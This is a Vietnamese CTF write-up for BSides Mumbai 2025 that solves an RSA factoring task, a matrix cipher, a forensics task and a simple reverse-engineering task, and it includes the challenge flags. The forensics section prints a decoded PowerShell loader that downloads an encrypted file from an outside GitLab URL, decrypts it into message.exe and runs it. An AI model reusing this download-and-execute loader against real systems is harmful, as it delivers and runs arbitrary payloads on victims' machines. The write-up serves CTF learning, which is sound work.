# Bside Mumbai 2025

# Crypto
## Too Small I Guess

### Description
I have 3 values but I don't know if it makes sense to you

### Attachment
```
N = 57003853477618592533708139357440215706141092564456154826439718767682290353899
c = 16088604257693894556768626620517616259596646357071343869173417352209986726562
e = 65537
```

Nhìn vào `N`, `c`, `e` ta có thể nhìn thấy ngay ở đây là khoá RSA.

### How it works
Khoá RSA dựa trên công thức sau: `N = p x q` - với `p` và `q` là 2 số nguyên tố lớn, khác nhau - và không dễ bị tính toán lại từ công thức `N = p x q`.

Với số `N` to đến mức này, chúng ta có thể dùng [FactorDB](factordb.com) và bỏ N vào để tìm p và q. 

Output:
```
p = 228337825920501024345892620188308555741
q = 249647001095058483196231850349361480039
```

Compare với `N` bằng cách nhân `p` và `q` lại với nhau, chúng ta thấy 2 số này nhân lại match hoàn toàn với số N ban đầu.

Giờ chúng ta đã có `N`, `c`, `e`, `p`, `q` - bỏ vào [dCode RSA Cipher Calculator](https://www.dcode.fr/rsa-cipher) 

Vì public key đã được cho sẵn (e), nên chúng ta không phải điền gì vào ô Private key.

![dcode](https://github.com/log1cs/writeups/raw/bside-ctf-2025/images/2SmallIGuess.png)

### Flag
```
BMCTF{S1z3_Matt3r5}
```

## Trixie Prixie
### Description
The Power of Friendship and Maffs!

### Attachments
Tải attachments cho Trixie Pixie tại [đây](https://github.com/log1cs/writeups/tree/bside-ctf-2025/attachments/TrixiePrixie).

### Flag
Riêng con này thì mình cho flag lên đầu cho mọi người biết trước, sau đó đọc visualize sẽ hiệu quả hơn ^^

```
BMCTF{Matrixie_crypt10n}
```

### How it works
* Đầu tiên:
    ```
    key = generated_valid_matrix() - Tạo khoá thật
    ```

    - Hàm `generated_valid_matrix()` sẽ sinh ra một ma trận 4x4 ngẫu nhiên có giá trị từ 0 đến 255.
    - Sau đó sẽ kiểm tra lại ma trận đó, theo 2 điều kiện sau:
        + Chính ma trận vừa tạo ra đó phải có nghịch đảo modulo 256
        + Ma trận đó sau khi xoay 90 độ (theo chiều kim đồng hồ) cũng phải có nghịch đảo modulo 256.

        ```
                if is_invertible_mod(mat, mod) and is_invertible_mod(np.rot90(mat), mod):
                    return mat
        ```
    - Nếu 2 điều kiện đó thoả mãn, tiếp tục đến với bước tiếp theo.

* Tiếp theo:
    ```
    fake_key = np.rot90(key) - tạo khoá giả bằng cách xoay mã thật 90 độ
    ```

* Cuối cùng thì:
    ```
    cipher = encrypt_message(flag, key)
    ```

    - Biến `cipher` sẽ được mã hoá bằng khoá thật.
    - Hàm `encrypt_message()` mã hoá một chuỗi ký tự theo khối 4 byte (biến `block_size` đã được hardcode thành 4, xem attachment để hiểu rõ hơn)
    - `message_bytes` = `message` chuyển thành ký tự ASCII.
        + Chẳng hạn như sau: `message` = `BMCTF{Matrixie_crypt10n}`

            | Thứ tự | Ký tự | ASCII |  | Thứ tự | Ký tự | ASCII |
            |-----|:-----:|:-----:|--|-----|:-----:|:-----:|
            |  1  |   B   |  66   |  |  13 |   i   |  105  |
            |  2  |   M   |  77   |  |  14 |   e   |  101  |
            |  3  |   C   |  67   |  |  15 |   _   |   95  |
            |  4  |   T   |  84   |  |  16 |   c   |   99  |
            |  5  |   F   |  70   |  |  17 |   r   |  114  |
            |  6  |   {   | 123   |  |  18 |   y   |  121  |
            |  7  |   M   |  77   |  |  19 |   p   |  112  |
            |  8  |   a   |  97   |  |  20 |   t   |  116  |
            |  9  |   t   | 116   |  |  21 |   1   |   49  |
            | 10  |   r   | 114   |  |  22 |   0   |   48  |
            | 11  |   i   | 105   |  |  23 |   n   |  110  |
            | 12  |   x   | 120   |  |  24 |   }   |  125  |

        + Lúc này `message_bytes` sẽ là:
        ```
        message_bytes = [
            66, 77, 67, 84, 70, 123, 77, 97,
            116, 114, 105, 120, 105, 101, 95, 99,
            114, 121, 112, 116, 49, 48, 110, 125
        ]
        ```
        
        + Sau đó hàm sẽ pad thêm ác phần tử 0 vào mảng, làm sao để tổng số phần tử của mảng chia hết cho 4.
        
        + Lúc này `message_bytes` sẽ là:
        ```
        message_bytes = [
            66, 77, 67, 84, 70, 123, 77, 97,
            116, 114, 105, 120, 105, 101, 95, 99,
            114, 121, 112, 116, 49, 48, 110, 125
        ]   
        # Không phải pad thêm phần tử nào vào mảng nữa vì tổng số phần tử đã chia hết cho 4.
        ```

        + Sau đó cứ mỗi 4 phần tử trong 1 mảng `message_bytes` sẽ được phân ra thành 1 mảng riêng:

        ```
        block_1 = [66, 77, 67, 84]
        block_2 = [70, 123, 77, 97]
        block_3 = [116, 114, 105, 120]
        block_4 = [105, 101, 95, 99]
        block_5 = [114, 121, 112, 116]
        block_6 = [49, 48, 110, 125]
        ```

        + Và được mã hoá với công thức:
        ```
        enc_block = (key @ block) % 256
        ```

        + Key thật chứa những giá trị sau:
        ```
        key = np.array([
            [ 91,  90, 170,  75],
            [229, 113, 141, 136],
            [241, 188, 139, 114],
            [ 68, 137,  13, 252]
        ])
        ```

        Và `fake_key` thì bằng key thật xoay 90 độ theo ngược chiều kim đồng hồ.

        + Sau khi mã hoá với `key = np.rot90(fake_key, k=-1)`:
        ```
        block_1 = [162, 142, 119, 212]
        block_2 = [173, 218, 59, 208]
        block_3 = [50, 171, 95, 71]
        block_4 = [236, 109, 176, 56]
        block_5 = [108, 179, 166, 233]
        block_6 = [246, 3, 197, 86]
        ```

        + Gộp lại thành
        ```
        cipher_bytes = [
            162, 142, 119, 212,
            173, 218, 59, 208,
            50, 171, 95, 71,
            236, 109, 176, 56,
            108, 179, 166, 233,
            246, 3, 197, 86
        ]
        ```
        
        + Sau đó ta có thể dùng `base64.b64encode(bytes(cipher_bytes))` để tạo ra [cipher.txt](https://github.com/log1cs/writeups/blob/bside-ctf-2025/attachments/TrixiePrixie/cipher.txt).

* Cuối cùng là 1 chuỗi các sự kiện:
    - `cipher_b64` = Cipher sau khi được mã hoá Base64
    ```
    cipher_b64 = base64.b64encode(bytes(cipher_bytes)).decode()
    ```
    - Ghi `cipher_b64` vào `cipher.txt`
    - Ghi `fake_key` vào `key.npy`

Và từ đó chúng ta đi ngược lại thao tác trên thì sẽ ra được output của đề bài. Tư duy ngược™

# Forensics 
## Disk Message
### Attachments
Tải attachments cho Disk Message tại [đây](https://github.com/log1cs/writeups/tree/bside-ctf-2025/attachments/DiskMessage).

Decode string Base64 trong file `disk.enc` ra bằng CyberChef, apply 2 options sau:

- From Base64
- Remove null bytes

Chúng ta sẽ nhận được output như dưới:
```
$e=(new-object Net.WebClient).DownloadString([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRsYWIuY29tLy0vc25pcHBldHMvNDg2NzQyOC9yYXcvbWFpbi91cGRhdGUuZW5j')));$ed=[System.Convert]::FromBase64String($e);$maes=new-object "System.Security.Cryptography.AesManaged";$maes.IV=$ed[0..15];$maes.Mode=[System.Security.Cryptography.CipherMode]::CBC;$maes.KeySize=256;$maes.BlockSize=128;$maes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;$maes.Key=[System.Security.Cryptography.HashAlgorithm]::Create('sha256').ComputeHash([System.Text.Encoding]::UTF8.GetBytes((& cmd /c vol).Split()[-1].Trim()));$dc=$maes.CreateDecryptor();$dm=$dc.TransformFinalBlock($ed, 16, $ed.Length - 16);Set-Content -Path "message.exe" -Value $dm -AsByteStream -NoNewline;.\message.exe
```

Ở đây chúng ta lại có thêm 1 string Base64 khác (`aHR0cHM6Ly9naXRsYWIuY29tLy0vc25pcHBldHMvNDg2NzQyOC9yYXcvbWFpbi91cGRhdGUuZW5j`), tiếp tục decode tiếp và chúng ta sẽ có được output là 1 đường link dẫn tới [1 file khác](https://gitlab.com/-/snippets/4867428/raw/main/update.enc).

Và file này lại được encode bằng Base64, chúng ta lại decode tiếp lần nữa:

![diskmsg](https://github.com/log1cs/writeups/raw/bside-ctf-2025/images/DiskMessage.png)

Chú ý đến header trong hình ảnh trên, đây là header của 1 file EXE. Đương nhiên thì tại vừa rồi chúng ta đã remove null bytes, nên một số thành phần của file EXE cũng đã bị lược bỏ đi khiến cho nó không thể chạy được.

Giờ thì tắt `Remove Null Bytes` đi để giữ được hết các raw contents trong file EXE. Better leave it untouched.

Lưu file trên CyberChef với đuôi EXE, chạy lên và chúng ta sẽ thấy được flag.

![diskmsg](https://github.com/log1cs/writeups/raw/bside-ctf-2025/images/DiskMessage2.png)

### Flag
```
BMCTF{n0t_3very0n3s_cup_of_t34}
```

# Reverse Engineering
## XORyy

### Attachments
Tải attachments cho Disk Message tại [đây](https://github.com/log1cs/writeups/tree/bside-ctf-2025/attachments/XORyy).

### How to solve
Đầu tiên chúng ta sẽ inspect xem binary này có bị stripped không.

```
$ file XORyy
XORyy: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c88d2f52c17496fcb5e8c72d4b015b1e7a564020, for GNU/Linux 3.2.0, not stripped
```

Vậy là file này không bị strip các symbol. Tuyệt vời.

Như mọi CTF khác, việc đầu tiên mọi người làm sau khi inspect file type chính là chạy `strings` xem có gì đặc biệt không.

Giờ chúng ta sẽ thử tìm xem trong đống string đó có flag không, bằng cách grep format flag của giải.

```
$ strings XORyy | grep BMCTF
Congratulations! You found the flag: BMCTF{X0R_Is_Fun}
```

### Flag
```
BMCTF{X0R_Is_Fun}
```
